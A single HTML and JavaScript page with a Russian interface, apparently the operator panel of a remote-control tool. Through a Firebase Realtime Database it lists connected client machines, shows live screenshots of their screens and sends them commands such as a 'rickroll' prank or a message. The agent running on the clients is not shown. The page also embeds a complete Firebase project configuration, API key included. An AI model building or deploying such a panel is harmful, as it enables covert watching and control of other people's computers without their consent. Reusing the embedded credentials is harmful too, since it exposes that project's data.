<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        body { background: #0a0a0a; color: #ccc; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; }
        .sidebar { background: #1a1a1a; width: 250px; padding: 1rem; border-right: 1px solid #333; overflow-y: auto; }
        .client-btn { display: block; width: 100%; margin: 4px 0; padding: 8px 12px; background: #2a2a2a; border: none; color: #ccc; text-align: left; border-radius: 4px; cursor: pointer; }
        .client-btn:hover { background: #3a3a3a; }
        .client-btn.active { background: #0b5ed7; color: white; }
        .main { flex: 1; padding: 1.5rem; }
        .screenshot { max-width: 100%; border: 1px solid #333; margin: 1rem 0; }
        button { margin: 4px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3>🖥 Клиенты</h3>
        <div id="clientList">Загрузка...</div>
        <div id="connectionStatus" style="font-size:0.8em; margin-top:10px;"></div>
    </div>
    <div class="main">
        <h2 id="selectedClient">Выберите клиента</h2>
        <img id="screenshotImg" class="screenshot" style="display:none;" alt="Скриншот">
        <div id="controls" style="display:none;">
            <button onclick="sendCommand('rickroll')">🎵 Rickroll</button>
            <button onclick="sendCommand('msg')">💬 Сообщение</button>
            <button onclick="sendCommand('screenshot')">📸 Обновить скриншот</button>
        </div>
    </div>

    <!-- Модульный Firebase SDK 9+ -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, onValue, set, off } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAAb2d_IOCpDO_niqfkjfWddhpZo0yaDOM",
            authDomain: "gen-lang-client-0884792103.firebaseapp.com",
            databaseURL: "https://gen-lang-client-0884792103-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "gen-lang-client-0884792103",
            storageBucket: "gen-lang-client-0884792103.firebasestorage.app",
            messagingSenderId: "556057210756",
            appId: "1:556057210756:web:45677d6e28066be811f7d1"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let currentClient = null;
        let screenListener = null;

        // Подключение к списку клиентов
        const clientsRef = ref(db, 'clients');
        onValue(clientsRef, (snapshot) => {
            const data = snapshot.val();
            const listDiv = document.getElementById('clientList');
            listDiv.innerHTML = '';
            if (!data) {
                listDiv.innerHTML = 'Нет клиентов';
                return;
            }
            Object.keys(data).forEach(clientId => {
                const btn = document.createElement('button');
                btn.className = 'client-btn';
                btn.textContent = clientId;
                btn.onclick = () => selectClient(clientId);
                listDiv.appendChild(btn);
            });
        });

        // Статус соединения
        const connectedRef = ref(db, '.info/connected');
        onValue(connectedRef, (snap) => {
            const el = document.getElementById('connectionStatus');
            el.textContent = snap.val() ? '🟢 Подключено' : '🔴 Отключено';
        });

        // Выбор клиента
        function selectClient(clientId) {
            // Убираем предыдущий активный класс
            if (currentClient) {
                const oldBtn = document.querySelector(`.client-btn.active`);
                if (oldBtn) oldBtn.classList.remove('active');
            }
            currentClient = clientId;
            // Подсвечиваем новую кнопку
            const btns = document.querySelectorAll('.client-btn');
            btns.forEach(b => {
                if (b.textContent === clientId) b.classList.add('active');
            });
            document.getElementById('selectedClient').textContent = `Управление: ${clientId}`;
            document.getElementById('controls').style.display = 'block';
            // Подписываемся на скриншот
            if (screenListener) off(screenListener);
            const screenRef = ref(db, `clients/${clientId}/screenshot`);
            screenListener = onValue(screenRef, (snap) => {
                const base64 = snap.val();
                const img = document.getElementById('screenshotImg');
                if (base64) {
                    img.src = `data:image/jpeg;base64,${base64}`;
                    img.style.display = 'block';
                } else {
                    img.style.display = 'none';
                }
            });
        }

        // Отправка команды
        window.sendCommand = function(cmd) {
            if (!currentClient) return alert('Сначала выберите клиента!');
            set(ref(db, `clients/${currentClient}/command`), cmd);
        };
    </script>
</body>
</html>
